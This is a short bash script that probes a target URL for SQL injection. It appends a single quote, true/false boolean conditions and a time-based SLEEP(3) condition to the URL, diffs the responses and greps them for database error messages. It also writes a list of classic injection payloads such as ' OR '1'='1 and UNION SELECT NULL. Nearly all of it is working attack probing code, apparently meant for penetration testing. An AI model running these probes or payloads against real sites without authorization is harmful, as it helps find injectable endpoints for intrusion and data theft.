#!/usr/bin/env bash
set -euo pipefail
TARGET="${1:?target required}"
OUTDIR="${2:-outputs}"
mkdir -p "$OUTDIR"

echo " manual_checks: target=$TARGET"

#simple single-quote error check
URL="$TARGET"
echo " single-quote error check -> $OUTDIR/single_quote.html"
curl -s "${URL}%27" -o "$OUTDIR/single_quote.html" || true
grep -nE "SQL|mysql|syntax|SQL syntax" "$OUTDIR/single_quote.html" || true

#boolean tests (true/false) - save outputs and diff
echo " boolean checks -> $OUTDIR/boolean_true.html $OUTDIR/boolean_false.html"
curl -s "${URL}+AND+1=1" -o "$OUTDIR/boolean_true.html" || true
curl -s "${URL}+AND+1=2" -o "$OUTDIR/boolean_false.html" || true
echo "---- diff (first 40 lines) ----"
diff -u "$OUTDIR/boolean_true.html" "$OUTDIR/boolean_false.html" | sed -n '1,40p' || true

#time-based (use small delay to avoid heavy load)
echo " time-based (SLEEP(5)) -> timing.txt"
TIME1=$(curl -s -w "%{time_total}\n" -o /dev/null "${URL}" )
TIME2=$(curl -s -w "%{time_total}\n" -o /dev/null "${URL}+AND+SLEEP(3)" )
echo "baseline: $TIME1" > "$OUTDIR/timing.txt"
echo "sleep(3): $TIME2" >> "$OUTDIR/timing.txt"
cat "$OUTDIR/timing.txt"

#common payload probe list (small) saved
cat > "$OUTDIR/payloads.txt" <<'PAYLOADS'
' OR '1'='1
' OR '1'='1' --
' OR 1=1#
" OR "1"="1
' UNION SELECT NULL,NULL --
' AND SLEEP(3) --
PAYLOADS

echo " manual_checks complete. payloads list -> $OUTDIR/payloads.txt"
